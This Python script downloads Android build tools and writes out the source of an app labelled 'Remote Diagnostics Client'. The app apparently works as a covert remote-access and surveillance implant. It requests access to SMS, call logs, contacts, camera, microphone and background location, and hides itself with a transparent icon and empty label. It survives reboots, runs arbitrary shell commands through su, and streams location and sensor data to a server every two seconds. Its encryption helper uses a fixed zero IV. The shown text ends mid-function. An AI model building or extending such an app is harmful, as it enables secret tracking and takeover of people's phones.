#!/usr/bin/env python3

import os, sys, re, time, platform, subprocess as sp, secrets
import urllib.request, zipfile, tarfile, shutil

SERVER_URL = ""
ENCRYPTION_KEY = ""

PROJECT_DIR = "android_client"
OUTPUT_APK = "app.apk"
SDK_ROOT = os.path.expanduser("~/android-sdk")
JDK_DIR = os.path.expanduser("~/jdk17")
SDK_TOOLS_URL = "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip"
JDK_URL = "https://corretto.aws/downloads/latest/amazon-corretto-17-x64-linux-jdk.tar.gz"
GRADLE_VERSION = "8.5"
GRADLE_DIST_URL = "https://services.gradle.org/distributions/gradle-" + GRADLE_VERSION + "-bin.zip"
WRAPPER_JAR_URL = "https://github.com/gradle/gradle/raw/v8.5.0/gradle/wrapper/gradle-wrapper.jar"

RELEASE_KEYSTORE_DIR = os.path.expanduser("~/.keys")
RELEASE_KEYSTORE = os.path.join(RELEASE_KEYSTORE_DIR, "onet-release.jks")
RELEASE_KEY_ALIAS = "onet"
RELEASE_KEY_PASSFILE = os.path.join(RELEASE_KEYSTORE_DIR, "onet.pass")


class L:
    OK = "\033[92m[ OK ]\033[0m"
    WARN = "\033[93m[WARN]\033[0m"
    ERR = "\033[91m[FAIL]\033[0m"
    INFO = "\033[96m[INFO]\033[0m"
    STEP = "\033[95m[STEP]\033[0m"


def log_ok(m):   print(f"{L.OK}   {m}")
def log_warn(m): print(f"{L.WARN} {m}")
def log_err(m):  print(f"{L.ERR}  {m}")
def log_info(m): print(f"{L.INFO} {m}")
def log_step(m): print(f"\n{L.STEP} {m}")


def run(cmd, check=False, capture=True, timeout=None, env=None, stdin=None):
    try:
        r = sp.run(cmd, stdout=sp.PIPE if capture else None,
                   stderr=sp.PIPE if capture else None,
                   stdin=stdin, timeout=timeout, env=env, text=True)
        if check and r.returncode != 0:
            raise RuntimeError(f"Command failed ({r.returncode}): {' '.join(cmd)}\n{r.stderr}")
        return r.returncode, r.stdout or "", r.stderr or ""
    except FileNotFoundError:
        return 127, "", f"Command not found: {cmd[0]}"
    except sp.TimeoutExpired:
        return 124, "", "timeout"


def has_command(name):
    return shutil.which(name) is not None


def download_with_retry(url, dest, retries=3, timeout=240):
    for i in range(1, retries + 1):
        try:
            log_info(f"Downloading ({i}/{retries}): {url}")
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp, open(dest, "wb") as f:
                shutil.copyfileobj(resp, f)
            if os.path.getsize(dest) < 1024:
                raise RuntimeError("file too small")
            return True
        except Exception as e:
            log_warn(f"Attempt {i} failed: {e}")
            try:
                os.remove(dest)
            except Exception:
                pass
            time.sleep(2)
    return False


def detect_pkg_manager():
    if has_command("apt-get"): return ("apt", ["apt-get", "install", "-y"], ["apt-get", "update"])
    if has_command("dnf"):     return ("dnf", ["dnf", "install", "-y"], None)
    if has_command("yum"):     return ("yum", ["yum", "install", "-y"], None)
    if has_command("pacman"):  return ("pacman", ["pacman", "-S", "--noconfirm"], None)
    if has_command("zypper"):  return ("zypper", ["zypper", "install", "-y"], None)
    if has_command("brew"):    return ("brew", ["brew", "install"], None)
    return (None, None, None)


def ensure_sudo():
    if os.geteuid() == 0:
        return ""
    if has_command("sudo"):
        rc, _, _ = run(["sudo", "-n", "true"])
        if rc == 0:
            return "sudo "
    return None


def ensure_system_dependencies():
    log_step("[sys] Checking system dependencies")
    required = ["unzip", "tar"]
    if not has_command("curl") and not has_command("wget"):
        required.append("curl")
    missing = [c for c in required if not has_command(c)]
    if not missing:
        log_ok("All required system commands present")
        return True
    log_warn(f"Missing system tools: {', '.join(missing)}")
    mgr, install_cmd, update_cmd = detect_pkg_manager()
    if not mgr:
        log_err("No supported package manager found"); return False
    prefix = ensure_sudo()
    if prefix is None:
        log_err("Cannot elevate privileges"); return False
    if update_cmd:
        log_info("Updating package index...")
        run((prefix.split() if prefix else []) + update_cmd, timeout=300)
    log_info(f"Installing: {' '.join(missing)}")
    cmd = (prefix.split() if prefix else []) + install_cmd + missing
    rc, out, err = run(cmd, timeout=600)
    if rc != 0:
        log_err(f"Install failed: {err.strip()[-300:]}"); return False
    log_ok("System dependencies installed"); return True


def _export_jdk_env():
    os.environ["JAVA_HOME"] = JDK_DIR
    os.environ["PATH"] = os.path.join(JDK_DIR, "bin") + os.pathsep + os.environ.get("PATH", "")


def ensure_jdk():
    log_step("[jdk] Ensuring JDK 17")
    if os.path.exists(JDK_DIR):
        jb = os.path.join(JDK_DIR, "bin", "java")
        if os.path.exists(jb):
            rc, _, _ = run([jb, "-version"])
            if rc == 0:
                log_ok(f"JDK already present: {JDK_DIR}"); _export_jdk_env(); return True
        shutil.rmtree(JDK_DIR, ignore_errors=True)
    if has_command("java"):
        rc, out, err = run(["java", "-version"])
        vl = (err or out).splitlines()[0] if (err or out) else ""
        if "17" in vl:
            log_ok(f"System has Java 17: {vl.strip()}"); return True
    os.makedirs(JDK_DIR, exist_ok=True)
    tb = os.path.join(JDK_DIR, "jdk.tar.gz")
    for url in [JDK_URL,
                "https://download.oracle.com/java/17/latest/jdk-17_linux-x64_bin.tar.gz",
                "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.10%2B7/OpenJDK17U-jdk_x64_linux_hotspot_17.0.10_7.tar.gz"]:
        log_info(f"Trying JDK mirror: {url.split('/')[2]}")
        if download_with_retry(url, tb, retries=2):
            break
    else:
        log_err("Could not download JDK 17"); return False
    log_info("Extracting JDK...")
    try:
        with tarfile.open(tb, "r:gz") as tar:
            tar.extractall(JDK_DIR)
    except Exception as e:
        log_err(f"Extract failed: {e}"); return False
    finally:
        try:
            os.remove(tb)
        except Exception:
            pass
    ex = None
    for d in os.listdir(JDK_DIR):
        full = os.path.join(JDK_DIR, d)
        if os.path.isdir(full) and (d.startswith("amazon-corretto") or d.startswith("jdk") or d.startswith("OpenJDK")):
            ex = full; break
    if not ex:
        log_err("No JDK folder found"); return False
    for it in os.listdir(ex):
        shutil.move(os.path.join(ex, it), JDK_DIR)
    os.rmdir(ex)
    jb = os.path.join(JDK_DIR, "bin", "java")
    if not os.path.exists(jb):
        log_err("JDK verification failed"); return False
    os.chmod(jb, 0o755)
    _export_jdk_env()
    log_ok(f"JDK 17 ready at {JDK_DIR}")
    return True


def _export_sdk_env():
    os.environ["ANDROID_SDK_ROOT"] = SDK_ROOT
    os.environ["ANDROID_HOME"] = SDK_ROOT
    os.environ["PATH"] = (os.path.join(SDK_ROOT, "platform-tools") + os.pathsep +
                          os.path.join(SDK_ROOT, "cmdline-tools", "latest", "bin") + os.pathsep +
                          os.environ.get("PATH", ""))


def ensure_sdk():
    log_step("[sdk] Ensuring Android SDK")
    sm = os.path.join(SDK_ROOT, "cmdline-tools", "latest", "bin", "sdkmanager")
    if os.path.exists(sm) and os.path.exists(os.path.join(SDK_ROOT, "platform-tools")):
        log_ok(f"Android SDK already present at {SDK_ROOT}"); _export_sdk_env(); return True
    if os.path.exists(SDK_ROOT):
        shutil.rmtree(SDK_ROOT, ignore_errors=True)
    os.makedirs(SDK_ROOT, exist_ok=True)
    zp = os.path.join(SDK_ROOT, "cmdline-tools.zip")
    if not download_with_retry(SDK_TOOLS_URL, zp, retries=3):
        log_err("Could not download SDK tools"); return False
    log_info("Extracting SDK tools...")
    try:
        with zipfile.ZipFile(zp, 'r') as zf:
            zf.extractall(SDK_ROOT)
    except Exception as e:
        log_err(f"Extract failed: {e}"); return False
    finally:
        try:
            os.remove(zp)
        except Exception:
            pass
    ex = os.path.join(SDK_ROOT, "cmdline-tools")
    if not os.path.exists(ex):
        log_err("cmdline-tools missing"); return False
    latest = os.path.join(SDK_ROOT, "latest")
    if os.path.exists(latest):
        shutil.rmtree(latest, ignore_errors=True)
    os.rename(ex, latest)
    os.makedirs(ex, exist_ok=True)
    shutil.move(latest, os.path.join(ex, "latest"))
    sm = os.path.join(SDK_ROOT, "cmdline-tools", "latest", "bin", "sdkmanager")
    if not os.path.exists(sm):
        log_err("sdkmanager missing"); return False
    os.chmod(sm, 0o755)
    for root, _, files in os.walk(os.path.dirname(sm)):
        for f in files:
            if f.endswith(".sh") or f in ("sdkmanager", "avdmanager", "lint", "retrace", "apkanalyzer"):
                try:
                    os.chmod(os.path.join(root, f), 0o755)
                except Exception:
                    pass
    log_info("Accepting SDK licenses...")
    ld = os.path.join(SDK_ROOT, "licenses")
    os.makedirs(ld, exist_ok=True)
    with open(os.path.join(ld, "android-sdk-license"), "w") as f:
        f.write("8933bad161af4178b1185d1a37fbf41ea5269c55\n")
        f.write("d56f5187479451eabf01fb78af6dfcb131a6481e\n")
        f.write("24333f8a63b6825ea9c5514f83c2829b004d1fee\n")
    with open(os.path.join(ld, "android-sdk-preview-license"), "w") as f:
        f.write("84831b9409646a918e30573bab4c9c91346d8abd\n")
    log_info("Installing SDK packages...")
    env = os.environ.copy()
    env["ANDROID_SDK_ROOT"] = SDK_ROOT
    env["JAVA_HOME"] = JDK_DIR
    env["PATH"] = os.path.join(JDK_DIR, "bin") + os.pathsep + env.get("PATH", "")
    try:
        r = sp.run([sm, "--sdk_root=" + SDK_ROOT, "platform-tools", "platforms;android-34", "build-tools;35.0.0"],
                   env=env, stdin=sp.DEVNULL, stdout=sp.PIPE, stderr=sp.STDOUT, text=True, timeout=1800)
        if r.returncode != 0:
            log_warn(f"sdkmanager returned {r.returncode}")
            if r.stdout:
                log_warn(r.stdout[-400:])
    except Exception as e:
        log_err(f"sdkmanager failed: {e}"); return False
    if not os.path.exists(os.path.join(SDK_ROOT, "platform-tools")):
        log_err("platform-tools missing"); return False
    if not os.path.exists(os.path.join(SDK_ROOT, "build-tools", "35.0.0")):
        log_err("build-tools missing"); return False
    _export_sdk_env()
    log_ok("Android SDK ready")
    return True


def ensure_gradle_wrapper():
    log_step("[gradle] Ensuring gradle wrapper")
    wd = os.path.join(PROJECT_DIR, "gradle", "wrapper")
    os.makedirs(wd, exist_ok=True)
    jar = os.path.join(wd, "gradle-wrapper.jar")
    need = True
    if os.path.exists(jar) and os.path.getsize(jar) > 40000:
        try:
            with zipfile.ZipFile(jar) as zf:
                _ = zf.namelist()
            need = False
        except Exception:
            need = True
    if need:
        if os.path.exists(jar):
            try:
                os.remove(jar)
            except Exception:
                pass
        for url in [WRAPPER_JAR_URL,
                    "https://raw.githubusercontent.com/gradle/gradle/v8.5.0/gradle/wrapper/gradle-wrapper.jar",
                    "https://repo1.maven.org/maven2/org/gradle/gradle-wrapper/8.5/gradle-wrapper-8.5.jar"]:
            if download_with_retry(url, jar, retries=2):
                try:
                    with zipfile.ZipFile(jar) as zf:
                        _ = zf.namelist()
                    break
                except Exception:
                    try:
                        os.remove(jar)
                    except Exception:
                        pass
        else:
            log_err("Could not download valid gradle-wrapper.jar"); return False
        log_ok("gradle-wrapper.jar downloaded and verified")
    else:
        log_ok("gradle-wrapper.jar already present")
    with open(os.path.join(wd, "gradle-wrapper.properties"), "w") as f:
        f.write("distributionBase=GRADLE_USER_HOME\n")
        f.write("distributionPath=wrapper/dists\n")
        f.write("distributionUrl=" + GRADLE_DIST_URL + "\n")
        f.write("zipStoreBase=GRADLE_USER_HOME\n")
        f.write("zipStorePath=wrapper/dists\n")
    gw = os.path.join(PROJECT_DIR, "gradlew")
    with open(gw, "w") as f:
        f.write('#!/bin/sh\nDIR="$(cd "$(dirname "$0")" && pwd)"\n')
        f.write('exec java -cp "$DIR/gradle/wrapper/gradle-wrapper.jar" org.gradle.wrapper.GradleWrapperMain "$@"\n')
    os.chmod(gw, 0o755)
    with open(os.path.join(PROJECT_DIR, "gradlew.bat"), "w") as f:
        f.write('@echo off\r\nset DIR=%~dp0\r\njava -cp "%DIR%\\gradle\\wrapper\\gradle-wrapper.jar" org.gradle.wrapper.GradleWrapperMain %*\r\n')
    return True


def ensure_signing_tools():
    log_step("[sign] Verifying signing tools")
    kt = shutil.which("keytool") or os.path.join(JDK_DIR, "bin", "keytool")
    if not os.path.exists(kt):
        log_err("keytool not found"); return False
    ap = os.path.join(SDK_ROOT, "build-tools", "35.0.0", "apksigner")
    if not os.path.exists(ap):
        log_err("apksigner missing"); return False
    os.chmod(ap, 0o755)
    log_ok("Signing tools ready")
    return True


def ensure_release_keystore():
    log_step("[keys] Ensuring release keystore")
    os.makedirs(RELEASE_KEYSTORE_DIR, mode=0o700, exist_ok=True)
    if os.path.exists(RELEASE_KEYSTORE) and os.path.exists(RELEASE_KEY_PASSFILE):
        log_ok(f"Release keystore present: {RELEASE_KEYSTORE}")
        return True
    pwd = secrets.token_urlsafe(24)
    kt = os.path.join(JDK_DIR, "bin", "keytool")
    if not os.path.exists(kt):
        kt = shutil.which("keytool") or "keytool"
    log_info("Generating 4096-bit RSA release keystore...")
    rc, _, err = run([kt, "-genkeypair", "-v",
        "-keystore", RELEASE_KEYSTORE,
        "-alias", RELEASE_KEY_ALIAS,
        "-keyalg", "RSA", "-keysize", "4096", "-validity", "10000",
        "-storepass", pwd, "-keypass", pwd,
        "-dname", "CN=OEM Service, O=OEM, C=US"], timeout=180)
    if rc != 0:
        log_err(f"keytool failed: {err}"); return False
    with open(RELEASE_KEY_PASSFILE, "w") as f:
        f.write(pwd)
    try:
        os.chmod(RELEASE_KEY_PASSFILE, 0o600)
    except Exception:
        pass
    log_ok(f"Release keystore ready: {RELEASE_KEYSTORE}")
    return True


def load_release_pass():
    try:
        with open(RELEASE_KEY_PASSFILE) as f:
            return f.read().strip()
    except Exception:
        return None


FILES = {
    "settings.gradle": 'rootProject.name = "AndroidClient"\ninclude \':app\'\n',
    "build.gradle": """buildscript {
    repositories { google(); mavenCentral() }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.2.0'
        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.22"
    }
}
allprojects { repositories { google(); mavenCentral() } }
task clean(type: Delete) { delete rootProject.buildDir }
""",
    "gradle.properties": """org.gradle.jvmargs=-Xmx2048m
android.useAndroidX=true
android.enableJetifier=true
android.suppressUnsupportedCompileSdk=34
""",
    "app/build.gradle": """plugins {
    id 'com.android.application'
    id 'kotlin-android'
}
android {
    namespace 'com.yourapp.client'
    compileSdk 34
    lint { checkReleaseBuilds false; abortOnError false }
    defaultConfig {
        applicationId "com.yourapp.client"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = '17' }
}
dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
}
""",
    "app/src/main/AndroidManifest.xml": """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
    <uses-permission android:name="android.permission.READ_CALENDAR" />
    <uses-permission android:name="android.permission.READ_USER_DICTIONARY" />
    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
    <uses-permission android:name="android.permission.READ_HISTORY_BOOKMARKS" />
    <uses-permission android:name="android.permission.BLUETOOTH" android:maxSdkVersion="30" />
    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" android:maxSdkVersion="30" />
    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
    <uses-permission android:name="android.permission.BLUETOOTH_ADVERTISE" />
    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission" />

    <application
        android:allowBackup="false"
        android:fullBackupContent="false"
        android:usesCleartextTraffic="false"
        android:networkSecurityConfig="@xml/network_security_config"
        android:icon="@drawable/transparent_icon"
        android:label=""
        android:roundIcon="@drawable/transparent_icon"
        android:theme="@style/Theme.AppCompat.NoActionBar"
        android:requestLegacyExternalStorage="true">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".CaptureActivity" android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
        <service android:name=".CommunicationService" android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="dataSync|connectedDevice|location" />
        <service android:name=".ReliabilityJobService"
            android:permission="android.permission.BIND_JOB_SERVICE"
            android:exported="false" />
        <receiver android:name=".NetworkChangeReceiver" android:enabled="true" android:exported="false">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
            </intent-filter>
        </receiver>
        <receiver android:name=".AlarmReceiver" android:enabled="true" android:exported="false" />
        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
""",
    "app/src/main/res/xml/network_security_config.xml": """<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
</network-security-config>
""",
    "app/src/main/res/drawable/transparent_icon.xml":
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle">\n'
        '    <solid android:color="#00000000" />\n'
        '</shape>\n',
    "app/src/main/res/layout/activity_main.xml": """<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent" android:layout_height="match_parent"
    android:orientation="vertical" android:gravity="center" android:padding="16dp">
    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
        android:text="Remote Diagnostics Client\\nRunning in background"
        android:textSize="18sp" android:gravity="center" />
</LinearLayout>
""",
    "app/src/main/res/values/strings.xml": '<resources>\n    <string name="app_name">Remote Client</string>\n</resources>\n',
}

KOTLIN_FILES = {
"app/src/main/java/com/yourapp/client/AESHelper.kt": r"""
package com.yourapp.client

import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

object AESHelper {
    private const val ALGORITHM = "AES/CBC/NoPadding"
    private const val BLOCK_SIZE = 16

    fun encrypt(data: String, key: String): String {
        val cipher = Cipher.getInstance(ALGORITHM)
        val secretKey = SecretKeySpec(key.toByteArray(Charsets.UTF_8), "AES")
        val iv = ByteArray(BLOCK_SIZE)
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, IvParameterSpec(iv))
        val input = data.toByteArray(Charsets.UTF_8)
        val padded = input.copyOf(input.size + (BLOCK_SIZE - input.size % BLOCK_SIZE))
        val encrypted = cipher.doFinal(padded)
        return encrypted.joinToString("") { "%02x".format(it) }
    }

    fun decrypt(hex: String, key: String): String {
        val cipher = Cipher.getInstance(ALGORITHM)
        val secretKey = SecretKeySpec(key.toByteArray(Charsets.UTF_8), "AES")
        val iv = ByteArray(BLOCK_SIZE)
        cipher.init(Cipher.DECRYPT_MODE, secretKey, IvParameterSpec(iv))
        val encrypted = hex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        val decrypted = cipher.doFinal(encrypted)
        val result = decrypted.takeWhile { it != 0.toByte() }.toByteArray()
        return String(result, Charsets.UTF_8)
    }
}
""",
"app/src/main/java/com/yourapp/client/CommandExecutor.kt": r"""
package com.yourapp.client

import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.File

object CommandExecutor {
    private const val SU_BINARY = "/system/bin/su"
    private const val SH_BINARY = "/system/bin/sh"

    fun execute(command: String): String {
        return try {
            val useSu = File(SU_BINARY).exists()
            val shell = if (useSu) SU_BINARY else SH_BINARY
            val process = Runtime.getRuntime().exec(arrayOf(shell, "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errorReader = BufferedReader(InputStreamReader(process.errorStream))
            val output = StringBuilder()
            var line: String? = reader.readLine()
            while (line != null) {
                output.append(line).append("\n")
                line = reader.readLine()
            }
            var errLine: String? = errorReader.readLine()
            while (errLine != null) {
                output.append(errLine).append("\n")
                errLine = errorReader.readLine()
            }
            process.waitFor()
            if (output.isEmpty()) "Command executed with no output." else output.toString()
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
}
""",
"app/src/main/java/com/yourapp/client/DeviceFingerprint.kt": r"""
package com.yourapp.client

import android.content.Context
import android.os.Build
import java.security.MessageDigest

object DeviceFingerprint {
    fun getDeviceId(context: Context): String {
        val screen = getScreenResolution(context)
        val ua = "Android ${Build.VERSION.RELEASE}; ${Build.MANUFACTURER} ${Build.MODEL}; ${Build.DEVICE} Chrome/120.0.0.0 SCR:$screen"
        return generateIdFromUa(ua)
    }

    private fun getScreenResolution(context: Context): String {
        val m = context.resources.displayMetrics
        return "${m.widthPixels}x${m.heightPixels}"
    }

    private fun generateIdFromUa(ua: String): String {
        val v = ua.substringAfter("Android ").substringBefore(";")
        val detailed = "ANDROID_${v}_CHROME_SCR${ua.substringAfter("SCR:")}"
        val h = MessageDigest.getInstance("SHA-256").digest(detailed.toByteArray())
        return h.take(3).joinToString("") { "%02X".format(it) }.uppercase()
    }
}
""",
"app/src/main/java/com/yourapp/client/TelemetryStreamer.kt": r"""
package com.yourapp.client

import android.Manifest
import android.bluetooth.BluetoothManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.util.ArrayDeque
import java.util.concurrent.ConcurrentHashMap
import javax.net.ssl.HttpsURLConnection

object TelemetryStreamer {
    private const val TAG = "TelemetryStreamer"
    private const val TICK_MS = 2000L
    private const val TREND_WINDOW = 15
    private const val ACCEL_VAR_WINDOW = 20

    @Volatile private var active = false
    private var job: Job? = null
    private var lm: LocationManager? = null
    private var sm: SensorManager? = null
    private var locListener: LocationListener? = null
    private var stepListener: SensorEventListener? = null

    @Volatile private var lastLoc: Location? = null
    @Volatile private var lastLocTs: Long = 0L

    private var sessionStart = 0L
    private var sampleCount = 0
    private var firstLat: Double? = null
    private var firstLon: Double? = null
    private var lastLat: Double? = null
    private var lastLon: Double? = null
    private var totalDistanceM = 0.0
    private var elevationGainM = 0.0
    private var elevationLossM = 0.0
    private var lastAlt: Double? = null
    private var baselineSteps = -1f
    private var lastSampleStep = -1f

    private val pressureBuf = ArrayDeque<Float>()
    private val lightBuf = ArrayDeque<Float>()
    private val altBuf = ArrayDeque<Double>()
    private val accelMagBuf = ArrayDeque<Float>()

    private val sensorValues = ConcurrentHashMap<Int, FloatArray>()

    private val sensorListener = object : SensorEventListener {
        override fun onSensorChanged(event: SensorEvent) {
            sensorValues[event.sensor.type] = event.values.clone()
            if (event.sensor.type == Sensor.TYPE_ACCELEROMETER) {
                val v = event.values
                val m = Math.sqrt((v[0]*v[0] + v[1]*v[1] + v[2]*v[2]).toDouble()).toFloat()
                synchronized(accelMagBuf) {
                    accelMagBuf.addLast(m)
                    while (accelMagBuf.size > ACCEL_VAR_WINDOW) accelMagBuf.removeFirst()
                }
            }
        }
        override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
    }

    fun isActive(): Boolean = active
    fun isJobAlive(): Boolean = job?.isActive == true

    fun start(context: Context, scope: CoroutineScope): Boolean {
        if (active) return true
        active = true
        sessionStart = System.currentTimeMillis()
        sampleCount = 0
        totalDistanceM = 0.0; elevationGainM = 0.0; elevationLossM = 0.0
        lastAlt = null; firstLat = null; firstLon = null; lastLat = null; lastLon = null
        baselineSteps = -1f; lastSampleStep = -1f
        synchronized(pressureBuf) { pressureBuf.clear() }
        synchronized(lightBuf) { lightBuf.clear() }
        synchronized(altBuf) { altBuf.clear() }
        synchronized(accelMagBuf) { accelMagBuf.clear() }

        val ctx = context.applicationContext

        try {
            lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        lastLoc = location
                        lastLocTs = System.currentTimeMillis()
                        processNewLocation(location)
                    }
                    @Deprecated("Deprecated in Java")
                    override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
                    override fun onProviderEnabled(p: String) {}
                    override fun onProviderDisabled(p: String) {}
                }
                for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
                    try {
                        if (lm?.isProviderEnabled(p) == true)
                            lm?.requestLocationUpdates(p, 1000L, 0f, locListener!!, Looper.getMainLooper())
                    } catch (_: Throwable) {}
                }
                for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
                    try {
                        val l = lm?.getLastKnownLocation(p)
                        if (l != null && (lastLoc == null || l.accuracy < lastLoc!!.accuracy)) {
                            lastLoc = l
                            lastLocTs = System.currentTimeMillis()
                            processNewLocation(l)
                        }
                    } catch (_: Throwable) {}
                }
            }
        } catch (e: Throwable) {
            Log.e(TAG, "loc init: " + e.message)
        }

        try {
            sm = ctx.getSystemService(Context.SENSOR_SERVICE) as SensorManager
            for (t in listOf(
                Sensor.TYPE_ACCELEROMETER, Sensor.TYPE_GYROSCOPE, Sensor.TYPE_MAGNETIC_FIELD,
                Sensor.TYPE_LIGHT, Sensor.TYPE_PROXIMITY, Sensor.TYPE_PRESSURE,
                Sensor.TYPE_AMBIENT_TEMPERATURE, Sensor.TYPE_GRAVITY,
                Sensor.TYPE_LINEAR_ACCELERATION, Sensor.TYPE_ROTATION_VECTOR,
                Sensor.TYPE_STEP_COUNTER
            )) {
                val s = sm?.getDefaultSensor(t) ?: continue
                try {
                    sm?.registerListener(sensorListener, s, SensorManager.SENSOR_DELAY_NORMAL)
                } catch (_: Throwable) {}
            }
            val stepDet = sm?.getDefaultSensor(Sensor.TYPE_STEP_DETECTOR)
            if (stepDet != null) {
                stepListener = object : SensorEventListener {
                    override fun onSensorChanged(e: SensorEvent) {}
                    override fun onAccuracyChanged(s: Sensor?, a: Int) {}
                }
                try {
                    sm?.registerListener(stepListener, stepDet, SensorManager.SENSOR_DELAY_NORMAL)
                } catch (_: Throwable) {}
            }
        } catch (e: Throwable) {
            Log.e(TAG, "sensor init: " + e.message)
        }

        job = scope.launch(Dispatchers.IO) {
            while (active) {
                try {
                    sampleCount++
                    val payload = collect(ctx)
                    post(ctx, payload)
                } catch (e: Throwable) {
                    Log.e(TAG, "tick: " + (e.message ?: ""))
                }
                delay(TICK_MS)
            }
        }
        return true
    }

    fun stop() {
        active = false
